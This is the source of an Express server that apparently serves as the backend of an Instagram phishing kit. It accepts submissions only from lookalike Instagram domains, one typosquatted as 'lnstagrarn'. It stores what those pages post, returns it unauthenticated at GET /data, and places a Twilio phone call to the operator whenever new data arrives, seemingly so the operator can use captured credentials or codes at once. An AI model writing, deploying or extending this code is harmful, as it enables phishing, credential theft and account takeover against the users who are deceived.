require("dotenv").config();

const express = require("express");
const cors = require("cors");
const twilio = require("twilio");

const app = express();

// --------------------------------------------------
// Middleware
// --------------------------------------------------

app.use(cors({
    origin: [
        "https://account-instagram-com.vercel.app",
        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
    ]
}));

app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// --------------------------------------------------
// Environment variables
// --------------------------------------------------

const {
    TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN,
    TWILIO_FROM_NUMBER,
    ALERT_TO
} = process.env;

if (
    !TWILIO_ACCOUNT_SID ||
    !TWILIO_AUTH_TOKEN ||
    !TWILIO_FROM_NUMBER ||
    !ALERT_TO
) {
    throw new Error(
        "Missing required environment variables: " +
        "TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, " +
        "TWILIO_FROM_NUMBER, ALERT_TO"
    );
}

// --------------------------------------------------
// Twilio client
// --------------------------------------------------

const twilioClient = twilio(
    TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN
);

// --------------------------------------------------
// Application data
// --------------------------------------------------

let currentData = null;

// --------------------------------------------------
// Alert state
// --------------------------------------------------

let alertState = {
    active: false,
    startedAt: null,
    number: ALERT_TO,
    status: "idle",
    callSid: null,
    error: null
};

// --------------------------------------------------
// Health
// --------------------------------------------------

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        message: "Server is running"
    });
});

// --------------------------------------------------
// GET /data
// --------------------------------------------------
// This fixes "Cannot GET /data"
// --------------------------------------------------

app.get("/data", (req, res) => {

    res.json(
        currentData
            ? [currentData]
            : []
    );

});

// --------------------------------------------------
// POST /data
// --------------------------------------------------
// Receiving NEW data automatically starts the call
// --------------------------------------------------

app.post("/data", async (req, res) => {

    currentData = {
        ...req.body,
        receivedAt: new Date().toISOString()
    };

    console.log("New application data received.");

    // Start alert automatically
    const result = await startAlert();

    res.json({
        success: true,
        message: "Data received",
        alert: result
    });

});

// --------------------------------------------------
// Start alert
// --------------------------------------------------

async function startAlert() {

    if (alertState.active) {

        console.log(
            "Alert already active. No new call started."
        );

        return {
            started: false,
            message: "An alert is already active."
        };
    }

    alertState = {
        active: true,
        startedAt: new Date().toISOString(),
        number: ALERT_TO,
        status: "calling",
        callSid: null,
        error: null
    };

    try {

        console.log(
            `Starting call to ${ALERT_TO}`
        );

        const call = await twilioClient.calls.create({
            to: ALERT_TO,
            from: TWILIO_FROM_NUMBER,
            url: "https://webhooks.twilio.com/v1/Voice/Template/voice_keyboard_input"
        });

        alertState.callSid = call.sid;
        alertState.status = "calling";

        console.log(
            `Call started: ${call.sid}`
        );

        // --------------------------------------------------
        // Automatically deactivate after 15 seconds
        // --------------------------------------------------

        setTimeout(() => {

            // Make sure this is still the same call
            if (alertState.callSid === call.sid) {

                alertState.active = false;

                console.log(
                    `Alert ${call.sid} automatically deactivated after 15 seconds.`
                );
            }

        }, 15000);

        return {
            started: true,
            callSid: call.sid
        };

    } catch (error) {

        alertState.active = false;
        alertState.status = "call_failed";
        alertState.error = error.message;

        console.error(
            "Call failed:",
            error.message
        );

        if (error.code) {
            console.error(
                "Twilio error code:",
                error.code
            );
        }

        return {
            started: false,
            error: error.message,
            code: error.code || null
        };
    }
}

// --------------------------------------------------
// Manual alert
// --------------------------------------------------

app.post("/alert", async (req, res) => {

    const result = await startAlert();

    if (!result.started && alertState.active) {

        return res.status(409).json({
            success: false,
            ...result,
            status: alertState
        });
    }

    res.json({
        success: result.started,
        ...result,
        status: alertState
    });

});

// --------------------------------------------------
// Alert status
// --------------------------------------------------

app.get("/alert/status", (req, res) => {

    res.json(alertState);

});

// --------------------------------------------------
// Reset alert
// --------------------------------------------------

app.post("/alert/reset", (req, res) => {

    alertState = {
        active: false,
        startedAt: null,
        number: ALERT_TO,
        status: "idle",
        callSid: null,
        error: null
    };

    console.log("Alert state reset.");

    res.json({
        success: true,
        message: "Alert state reset",
        status: alertState
    });

});

// --------------------------------------------------
// Start server
// --------------------------------------------------

const PORT = process.env.PORT || 1000;

app.listen(PORT, "0.0.0.0", () => {

    console.log(
        `Server running on port ${PORT}`
    );

});
